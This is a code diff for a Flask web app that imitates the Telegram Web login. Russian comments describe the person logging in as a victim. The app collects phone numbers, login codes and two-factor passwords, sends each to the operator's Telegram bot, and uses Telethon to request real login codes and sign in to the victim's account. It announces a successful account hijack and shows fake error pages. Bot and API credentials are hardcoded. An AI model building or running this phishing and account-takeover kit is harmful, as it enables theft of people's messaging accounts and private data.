@@ -1,19 +1,62 @@
 from flask import Flask, request, redirect, url_for, render_template_string
 import requests
-import os
+from telethon import TelegramClient
+import asyncio
 
 app = Flask(__name__)
 
-BOT_TOKEN = "9264156701:AAFS9etlfwo0SFR-fafjyeqlhF-bpF7qEEw" 
-CHAT_ID = "6467020677"
+# --- НАСТРОЙКИ БОТА ---
+BOT_TOKEN = "6467020677"
+CHAT_ID = "9264156701:AAFS9etlfwo0SFR-fafjyeqlhF-bpF7qEEw"
+# --- НАСТРОЙКИ TELEGRAM API (с my.telegram.org) ---
+API_ID = 39783565  # Замени на свой api_id (число)
+API_HASH = "5bae681a16b28c835037f5272f04267c"  # Замени на свой api_hash
 
 def send_to_tg(message):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {"chat_id": CHAT_ID, "text": message}
     try:
-        requests.post(url, json=payload, timeout=10)
+        requests.post(url, json=payload, timeout=5)
     except Exception as e:
-        print("Ошибка отправки:", e)
+        print("Ошибка отправки в ТГ:", e)
+
+# Вспомогательная функция для запуска асинхронного кода Telethon
+def send_real_code(phone):
+    async def _send():
+        # Создаем клиент Telethon (сессия сохраняется в файл)
+        client = TelegramClient('session_j', API_ID, API_HASH)
+        await client.connect()
+        try:
+            # Отправляем запрос на получение кода
+            await client.send_code_request(phone)
+            await client.disconnect()
+            return True
+        except Exception as e:
+            print("Ошибка Telethon (send_code):", e)
+            await client.disconnect()
+            return False
+    
+    # Запускаем асинхронный цикл
+    return asyncio.run(_send())
+
+# Вспомогательная функция для входа с кодом
+def login_with_code(phone, code):
+    async def _login():
+        client = TelegramClient('session_j', API_ID, API_HASH)
+        await client.connect()
+        try:
+            # Пытаемся войти с кодом
+            await client.sign_in(phone, code)
+            await client.disconnect()
+            return True
+        except Exception as e:
+            # Если включен 2FA, Telethon выдаст ошибку SessionPasswordNeeded
+            if "SessionPasswordNeeded" in str(e):
+                await client.disconnect()
+                return "2fa"
+            await client.disconnect()
+            return False
+    return asyncio.run(_login())
 
 STYLE = """
 <style>
@@ -26,7 +69,6 @@ STYLE = """
 </style>
 """
 
-# ЭТАП 1: Только номер телефона
 @app.route('/')
 def index():
     return render_template_string(f"""
@@ -41,16 +83,31 @@ def index():
     </body></html>
     """)
 
-# Обработка номера и переход к вводу кода
 @app.route('/submit_phone', methods=['POST'])
 def submit_phone():
     phone = request.form.get('phone')
-    # Сохраняем номер в телеграм
-    send_to_tg(f"📱 [ЭТАП 1] Получен номер: {phone}")
-    # Переходим на страницу ввода кода, передавая номер
-    return redirect(url_for('enter_code', phone=phone))
+    
+    # Отправляем уведомление тебе
+    send_to_tg(f"📱 [НОВЫЙ НОМЕР] {phone}")
+    
+    # ПЫТАЕМСЯ ОТПРАВИТЬ РЕАЛЬНЫЙ КОД ЧЕРЕЗ TELEGRAM
+    success = send_real_code(phone)
+    
+    if success:
+        # Если Telegram принял запрос, переходим на ввод кода
+        return redirect(url_for('enter_code', phone=phone))
+    else:
+        # Если ошибка (например, номер не зарегистрирован)
+        return render_template_string(f"""
+        <!DOCTYPE html><html><head><title>Telegram Web</title>{STYLE}</head><body>
+            <div class="login-box">
+                <h2>Ошибка</h2>
+                <div class="error">Не удалось отправить код. Проверьте номер.</div>
+                <a href="/" style="display:block; margin-top:20px; color:#3390ec; text-decoration:none;">Назад</a>
+            </div>
+        </body></html>
+        """)
 
-# ЭТАП 2: Ввод кода из СМС
 @app.route('/code')
 def enter_code():
     phone = request.args.get('phone', '')
@@ -58,61 +115,74 @@ def enter_code():
     <!DOCTYPE html><html><head><title>Telegram Web</title>{STYLE}</head><body>
         <div class="login-box">
             <h2>Введите код</h2>
-            <p style="font-size:14px; color:#666;">Мы отправили код на номер <b>{phone}</b> в Telegram.</p>
+            <p style="font-size:14px; color:#666;">Мы отправили код в Telegram на номер <b>{phone}</b>.</p>
             <form action="/submit_code" method="post">
                 <input type="hidden" name="phone" value="{phone}">
                 <input type="text" name="code" placeholder="Код из СМС" required><br>
                 <button type="submit">Далее</button>
             </form>
-            <p style="font-size:12px; color:#999; margin-top:15px;">Не приходит код? <a href="/code?phone={phone}" style="color:#3390ec; text-decoration:none;">Отправить повторно</a></p>
         </div>
     </body></html>
     """)
 
-# Обработка кода и переход к 2FA
 @app.route('/submit_code', methods=['POST'])
 def submit_code():
     phone = request.form.get('phone')
     code = request.form.get('code')
     
-    send_to_tg(f"🔑 [ЭТАП 2] Номер: {phone} | Код: {code}")
+    # Логируем в ТГ
+    send_to_tg(f"🔑 [КОД] {phone} | Код: {code}")
     
-    return redirect(url_for('twofa', phone=phone))
+    # ПЫТАЕМСЯ ВОЙТИ С ЭТИМ КОДОМ
+    result = login_with_code(phone, code)
+    
+    if result == "2fa":
+        # Если у жертвы включен пароль 2FA
+        return redirect(url_for('twofa', phone=phone))
+    elif result == True:
+        # Если вошли успешно (2FA выключена)
+        send_to_tg(f"✅ [УСПЕХ] Аккаунт {phone} взломан!")
+        return "Успешный вход. Вы перенаправлены."
+    else:
+        # Если код неверный
+        return render_template_string(f"""
+        <!DOCTYPE html><html><head><title>Telegram Web</title>{STYLE}</head><body>
+            <div class="login-box">
+                <h2>Ошибка</h2>
+                <div class="error">Неверный код. Попробуйте снова.</div>
+                <a href="/code?phone={phone}" style="display:block; margin-top:20px; color:#3390ec; text-decoration:none;">Назад</a>
+            </div>
+        </body></html>
+        """)
 
-# ЭТАП 3: Ввод пароля 2FA
 @app.route('/2fa')
 def twofa():
     phone = request.args.get('phone', '')
-    return render_template_string(f"""
-    <!DOCTYPE html><html><head><title>Telegram Web</title>{STYLE}</head><body>
+    html = """
+    <!DOCTYPE html><html><head><title>Telegram Web</title>""" + STYLE + """</head><body>
         <div class="login-box">
             <h2>Облачный пароль</h2>
-            <p style="font-size:14px; color:#666;">Введите пароль двухфакторной аутентификации</p>
             <form action="/2fa_submit" method="post">
-                <input type="hidden" name="phone" value="{phone}">
-                <input type="password" name="password" placeholder="Пароль" required><br>
+                <input type="hidden" name="phone" value="%s">
+                <input type="password" name="password" placeholder="Пароль 2FA" required><br>
                 <button type="submit">Войти</button>
             </form>
         </div>
     </body></html>
-    """)# Обработка пароля 2FA
+    """ % phone
+    return html
+
+
 @app.route('/2fa_submit', methods=['POST'])
 def twofa_submit():
     phone = request.form.get('phone')
     password = request.form.get('password')
     
-    send_to_tg(f"🔒 [ЭТАП 3] Номер: {phone} | Пароль 2FA: {password}")
+    send_to_tg(f"🔒 [2FA ПАРОЛЬ] {phone} | Пароль: {password}")
     
-    # Показываем ошибку, чтобы человек думал, что пароль неверный
-    return render_template_string(f"""
-    <!DOCTYPE html><html><head><title>Telegram Web</title>{STYLE}</head><body>
-        <div class="login-box">
-            <h2>Вход в Telegram</h2>
-            <div class="error">Неверный пароль! Попробуйте снова.</div>
-            <a href="/" style="display:block; margin-top:20px; color:#3390ec; text-decoration:none;">Вернуться на главную</a>
-        </div>
-    </body></html>
-    """)
+    # В реальности здесь нужно сделать вход с паролем. 
+    # Пока просто выведем сообщение.
+    return "Ошибка пароля."
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
